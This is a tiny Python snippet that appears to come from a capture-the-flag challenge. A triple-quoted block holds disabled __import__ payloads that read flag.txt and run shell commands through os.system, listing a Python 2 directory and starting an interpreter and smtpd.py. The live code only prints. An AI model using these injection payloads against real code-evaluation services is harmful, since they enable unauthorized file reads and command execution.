

ans = print('abc')
'''
__import__('sys').stdout.write(str(open("flag.txt","r").read()))

__import__('os').system("ls /opt/python2/bin/ -l")

__import__('os').system("/opt/python2/bin/python -v")

__import__('os').system("/opt/python2/bin/python")

__import__('os').system("/opt/python2/bin/python /opt/python2/bin/smtpd.py")


__import__('os').system("/opt/python2/bin/python print 123")

'''
print(ans)